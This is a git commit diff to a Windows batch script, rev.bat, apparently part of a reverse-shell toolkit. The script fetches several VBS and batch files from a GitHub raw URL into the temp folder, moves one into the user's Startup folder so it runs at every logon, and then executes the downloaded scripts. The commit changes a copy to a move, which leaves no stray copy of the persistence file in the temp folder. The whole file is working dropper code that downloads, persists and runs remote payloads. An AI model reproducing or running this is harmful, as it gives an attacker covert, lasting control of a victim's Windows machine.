0298d5e20317f46b73b54f4a695e84d40697086d
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 04:43:31 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -5,7 +5,7 @@ curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o %temp%\vb.vbs
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%temp%\vb1.vbs"
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\post.bat"
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
-copy "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+move "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 start /wait %temp%\vb.vbs
 call "%temp%\vb1.vbs"
 exit
